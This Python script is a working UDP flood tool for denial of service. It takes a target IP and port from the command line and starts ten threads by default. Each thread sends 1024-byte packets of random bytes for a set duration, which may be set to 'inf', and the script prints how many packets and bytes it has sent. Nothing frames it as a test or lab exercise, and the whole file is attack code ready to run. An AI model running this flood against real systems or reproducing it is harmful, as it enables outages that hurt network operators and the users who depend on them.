import os
import sys
import time
import socket
import random
from threading import Thread


config = {
    'duration': 5,  # seconds
    'packet-len': 1024,  # bytes
    'ip': '127.0.0.1',
    'port': 3030,
    'timeout': 0,
    'threads': 10,
    'total_packets_sent': 0,
    'total_bytes_sent': 0,
    'begin': time.time()
}


def printer():
    begin = int(config['begin'])
    last_packets_sent_counter = 0
    while True:
        if config['total_packets_sent'] > last_packets_sent_counter:
            print('[{} SECS] Sent {} packets and {} bytes'.format(int(time.time() - begin),
                                                                  config['total_packets_sent'],
                                                                  config['total_bytes_sent']))
            last_packets_sent_counter = config['total_packets_sent']
        time.sleep(float(config['timeout']))


def start():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while config['duration'] == 'inf' or config['begin'] + int(config['duration']) > time.time():
            try:
                sock.sendto(random._urandom(int(config['packet-len'])), (config['ip'], int(config['port'])))
            except OSError:
                continue
            config['total_packets_sent'] += 1
            config['total_bytes_sent'] += int(config['packet-len'])

            time.sleep(float(config['timeout']))
    except BrokenPipeError:
        print('[ERROR] Router has closed the connection')

    else:
        print('[TIMEOUT] Timeout has been reached')

    os.abort()


if __name__ == '__main__':
    args = sys.argv[1:]
    config['ip'], config['port'] = args[:2]

    arg = 'null'

    try:
        for arg in config.keys():
            if '--' + arg in args:
                config[arg] = args[args.index('--' + arg) + 1]
    except IndexError:
        print('[ERROR] Missing value for --' + arg)

    try:
        config['begin'] = time.time()

        Thread(target=printer).start()

        threads = []

        for _ in range(int(config['threads'])):
            threads.append(Thread(target=start))

        for thread in threads:
            thread.start()

    except KeyboardInterrupt:
        print('\nQuit')
        os.abort()

